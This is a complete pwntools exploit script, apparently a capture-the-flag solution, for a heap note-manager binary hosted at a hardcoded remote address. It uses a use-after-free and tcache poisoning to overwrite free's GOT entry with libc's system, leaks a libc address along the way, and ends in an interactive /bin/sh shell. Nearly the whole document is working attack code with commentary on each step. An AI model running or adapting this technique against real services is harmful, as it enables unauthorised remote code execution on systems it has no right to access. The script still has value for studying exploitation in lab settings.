#!/usr/bin/env python
from pwn import *

# context.arch = "amd64"
context.log_level = "debug" # debug, info, warn
context.terminal = ["tmux", "splitw", "-h"]

BINARY = "./main"
HOST = "52.73.40.215"
PORT = 1028

uu64 = lambda x: u64(x.ljust(8, b"\x00"))
uu32 = lambda x: u32(x.ljust(4, b"\x00"))

def attach(r):
    gdbscript = [
        'b *0x400D7B',
        'b *0x400acf',
    ]
    if type(r) == process:
        gdb.attach(r, '\n'.join(gdbscript))

def add(length, name, ret=False):
    r.sendlineafter(b'>', b'1')
    r.sendlineafter(b'?', b'%d' % length)
    r.sendafter(b':', b'%s' % name)
    if ret:
        r.recvuntil(b' : ')
        return int(r.recvline(0), 16)
    return None

def edit(idx, length, name):
    r.sendlineafter(b'>', b'2')
    r.sendlineafter(b'?\n', b'%d' % idx)
    r.sendlineafter(b':', b'%d' % length)
    r.sendline(b'%s' % name)
    # r.sendline(b'%d' % length)
    # r.send(b'\n')

def view(idx):
    r.sendlineafter(b'>', b'4')
    r.sendlineafter(b'?\n', b'%d' % idx)
    r.recvuntil(b'name:')
    return r.recvuntil('\n1 - Add', 1)

def free():
    r.sendlineafter(b'>', b'5')

def exploit():
    heap = add(0x2, b"a\n", 1)
    add(0x2, b"b\n") # prevent consolidation with top chunk

    info('heap %x' % heap)

    free()

    # uaf, tcache poisoning
    # target is one bytes before free.got, not sure why, but it always break
    # when target is free.got directly
    edit(1, 6, p64(0x602008)[:6]) 

    add(0x18, b'/bin/sh;\n')

    # don't overwrite free.got yet, first we need the leak
    victim = add(0x10, b'a' * 0x10, 1)

    info('did it? %x' % victim) 
    assert(victim == 0x602008)

    # attach(r)
    leak = view(3)[0x10:]
    leak = uu64(leak)
    info('leak %x' % leak)
    libc = leak - 0x09d880 # free offset

    # overwrite free.got with libc.system
    edit(3, 0x18, b'a' * 0x10 + p64(libc + 0x0554e0))

    # this will 'free' all note, but we will ends up in system("/bin/sh")
    # anyway
    free()

if len(sys.argv) > 1:
    r = remote(HOST, PORT)
else:
    r = process(BINARY, aslr=1)

exploit()
r.interactive()
